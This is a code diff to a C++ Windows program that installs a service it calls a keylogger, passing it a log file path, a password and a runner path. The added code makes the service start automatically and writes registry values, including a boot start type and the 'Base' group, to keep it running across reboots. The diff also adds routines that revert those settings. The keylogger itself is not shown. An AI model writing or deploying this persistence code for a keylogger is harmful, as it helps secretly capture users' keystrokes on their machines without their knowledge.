@@ -49,7 +49,7 @@ bool CreateAndStartService(const std::wstring& serviceName, const std::wstring& 
         displayName.c_str(),    // service name to display 
         SERVICE_ALL_ACCESS,     // desired access 
         SERVICE_WIN32_OWN_PROCESS, // service type 
-        SERVICE_DEMAND_START,   // start type 
+        SERVICE_AUTO_START,   // start type 
         SERVICE_ERROR_NORMAL,   // error control type 
         exePath.c_str(),       // path to service's binary and parameters 
         NULL,                   // no load ordering group 
@@ -64,7 +64,7 @@ bool CreateAndStartService(const std::wstring& serviceName, const std::wstring& 
         CloseServiceHandle(hSCM);
         return false;
     }
-
+    
     // Start the service
     if (!StartService(hService, argCount, lpServiceArgVectors)) {
         std::wcerr << L"StartService failed, error: " << GetLastError() << std::endl;
@@ -72,7 +72,8 @@ bool CreateAndStartService(const std::wstring& serviceName, const std::wstring& 
         CloseServiceHandle(hSCM);
         return false;
     }
-
+    
+    
     std::wcout << L"Service created and started successfully." << std::endl;
 
     // Close service handles
@@ -81,6 +82,52 @@ bool CreateAndStartService(const std::wstring& serviceName, const std::wstring& 
 
     return true;
 }
+bool SetServiceRegistrySettings(const std::wstring& serviceName, const std::wstring& servicePath, const std::wstring& startupArguments) {
+    HKEY hKey;
+    std::wstring keyPath = L"SYSTEM\\CurrentControlSet\\Services\\" + serviceName;
+
+    // Open the registry key for the service
+    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, keyPath.c_str(), 0, KEY_SET_VALUE, &hKey) != ERROR_SUCCESS) {
+        std::wcerr << L"RegOpenKeyEx failed, error: " << GetLastError() << std::endl;
+        return false;
+    }
+    std::wstring imagePath = servicePath + L" " + startupArguments;
+    if (RegSetValueEx(hKey, L"ImagePath", 0, REG_SZ, (const BYTE*)imagePath.c_str(), (imagePath.length() + 1) * sizeof(wchar_t)) != ERROR_SUCCESS) {
+        std::wcerr << L"RegSetValueEx failed for ImagePath, error: " << GetLastError() << std::endl;
+        RegCloseKey(hKey);
+        return false;
+    }
+    // Set the service start type
+    DWORD startType = SERVICE_BOOT_START;
+    if (RegSetValueEx(hKey, L"Start", 0, REG_DWORD, (const BYTE*)&startType, sizeof(startType)) != ERROR_SUCCESS) {
+        std::wcerr << L"RegSetValueEx failed, error: " << GetLastError() << std::endl;
+        RegCloseKey(hKey);
+        return false;
+    }
+
+    // Set the service group
+    std::wstring group = L"Base";
+    if (RegSetValueEx(hKey, L"Group", 0, REG_SZ, (const BYTE*)group.c_str(), (group.length() + 1) * sizeof(wchar_t)) != ERROR_SUCCESS) {
+        std::wcerr << L"RegSetValueEx failed, error: " << GetLastError() << std::endl;
+        RegCloseKey(hKey);
+        return false;
+    }
+
+    // Set the service parameters (startup arguments)
+    if (!startupArguments.empty()) {
+        if (RegSetValueEx(hKey, L"Parameters", 0, REG_SZ, (const BYTE*)startupArguments.c_str(), (startupArguments.length() + 1) * sizeof(wchar_t)) != ERROR_SUCCESS) {
+            std::wcerr << L"RegSetValueEx failed for Parameters, error: " << GetLastError() << std::endl;
+            RegCloseKey(hKey);
+            return false;
+        }
+    }
+
+    // Close the registry key
+    RegCloseKey(hKey);
+
+    return true;
+}
+
 
 bool StopAndDeleteService(const std::wstring& serviceName) {
     SC_HANDLE schSCManager = NULL;
@@ -151,6 +198,88 @@ bool StopAndDeleteService(const std::wstring& serviceName) {
     CloseServiceHandle(schSCManager);
     return true;
 }
+bool UndoServiceRegistrySettings(const std::wstring& serviceName) {
+    HKEY hKey;
+    std::wstring keyPath = L"SYSTEM\\CurrentControlSet\\Services\\" + serviceName;
+
+    // Open the registry key for the service
+    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, keyPath.c_str(), 0, KEY_SET_VALUE, &hKey) != ERROR_SUCCESS) {
+        std::wcerr << L"RegOpenKeyEx failed, error: " << GetLastError() << std::endl;
+        return false;
+    }
+
+    // Set the service start type back to SERVICE_DEMAND_START
+    DWORD startType = SERVICE_DEMAND_START;
+    if (RegSetValueEx(hKey, L"Start", 0, REG_DWORD, (const BYTE*)&startType, sizeof(startType)) != ERROR_SUCCESS) {
+        std::wcerr << L"RegSetValueEx failed, error: " << GetLastError() << std::endl;
+        RegCloseKey(hKey);
+        return false;
+    }
+
+    // Delete the Group value
+    if (RegDeleteValue(hKey, L"Group") != ERROR_SUCCESS) {
+        std::wcerr << L"RegDeleteValue failed, error: " << GetLastError() << std::endl;
+        RegCloseKey(hKey);
+        return false;
+    }
+
+    // Delete the Parameters value (startup arguments)
+    if (RegDeleteValue(hKey, L"Parameters") != ERROR_SUCCESS) {
+        std::wcerr << L"RegDeleteValue failed for Parameters, error: " << GetLastError() << std::endl;
+        RegCloseKey(hKey);
+        return false;
+    }
+
+    // Close the registry key
+    RegCloseKey(hKey);
+    return true;
+}
+
+bool ChangeServiceStartType(const std::wstring& serviceName, DWORD newStartType) {
+    SC_HANDLE hSCManager = NULL;
+    SC_HANDLE hService = NULL;
+    bool result = false;
+
+    // Open the Service Control Manager
+    hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
+    if (hSCManager == NULL) {
+        std::cerr << "OpenSCManager failed, error: " << GetLastError() << std::endl;
+        return false;
+    }
+
+    // Open the specified service
+    hService = OpenService(hSCManager, serviceName.c_str(), SERVICE_CHANGE_CONFIG);
+    if (hService == NULL) {
+        std::cerr << "OpenService failed, error: " << GetLastError() << std::endl;
+        CloseServiceHandle(hSCManager);
+        return false;
+    }
+
+    // Change the service start type
+    if (ChangeServiceConfig(
+        hService,                // handle to service
+        SERVICE_NO_CHANGE,       // service type: no change
+        newStartType,            // start type: SERVICE_DEMAND_START
+        SERVICE_NO_CHANGE,       // error control: no change
+        NULL,                    // binary path: no change
+        NULL,                    // load order group: no change
+        NULL,                    // tag ID: no change
+        NULL,                    // dependencies: no change
+        NULL,                    // account name: no change
+        NULL,                    // password: no change
+        NULL)) {                 // display name: no change
+        result = true;
+    }
+    else {
+        std::cerr << "ChangeServiceConfig failed, error: " << GetLastError() << std::endl;
+    }
+
+    // Clean up
+    CloseServiceHandle(hService);
+    CloseServiceHandle(hSCManager);
+
+    return result;
+}
 int wmain(int argc, wchar_t* argv[])
 {
     std::wstring servicePath = GetFullPath(L"MiniService.exe");
@@ -192,11 +321,46 @@ int wmain(int argc, wchar_t* argv[])
     std::wcout << L"Installing keylogger..." << std::endl;
     // Your installation code here...
     const wchar_t* args[] = { logFilePath.c_str(), password.c_str(), runnerPath.c_str(), NULL};
+    std::wstringstream ss;
+    for (int i = 0; args[i] != NULL; ++i) {
+        if (i > 0) {
+            ss << L" ";
+        }
+        ss << args[i];
+    }
+    std::wstring params = ss.str();
+    std::wcout << L"Arguments:"  << std::endl;
+    std::wcout << L"Arguments: " << params << std::endl;
+
     std::wcout << L"Keylogger installed successfully!" << std::endl;
     std::wstring serviceName = L"SampleService";
-    CreateAndStartService(serviceName, L"MyService", servicePath, args);
+
+    if (CreateAndStartService(serviceName, L"MyService", servicePath, args)) {
+        if (SetServiceRegistrySettings(serviceName, servicePath, params)) {
+            std::wcout << L"Service registry settings configured successfully" << std::endl;
+        }
+        else {
+            std::wcerr << L"Failed to configure service registry settings" << std::endl;
+        }
+    }
+    else {
+        std::wcerr << L"Failed to create and start service" << std::endl;
+    }
     getchar();
-    StopAndDeleteService(serviceName);
+    if (UndoServiceRegistrySettings(serviceName)) {
+        std::wcout << L"Service registry settings reverted successfully" << std::endl;
+    }
+    else {
+        std::wcerr << L"Failed to revert service registry settings" << std::endl;
+    }
+
+    if(StopAndDeleteService(serviceName)) {
+		std::wcout << L"Service stopped and deleted successfully" << std::endl;
+	}
+	else {
+		std::wcerr << L"Failed to stop and delete service" << std::endl;
+	}
+
     return 0;
 }
 
